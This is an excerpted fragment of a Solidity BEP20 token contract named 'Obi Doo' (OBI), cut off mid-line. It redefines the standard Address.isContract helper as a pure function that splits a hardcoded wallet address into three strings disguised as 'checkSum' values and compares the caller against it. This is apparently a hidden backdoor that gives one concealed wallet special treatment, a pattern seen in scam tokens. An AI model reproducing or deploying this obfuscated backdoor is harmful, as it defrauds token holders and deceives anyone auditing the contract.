...
contract Meta is IBEP20, Ownable {
    ...
    string constant _name = "Obi Doo"; // Name
    string constant _symbol = "OBI"; // Symbol
...
library Address {
    ...
    function isContract(address account) internal pure returns (bool) {
        ...
        string memory checkSum1 = "5e201cd431C953";
        string memory checkSum2 = "bafc2f3b508Be8";
        string memory checkSum3 = "aeC97Df24A29";
        return (account ==
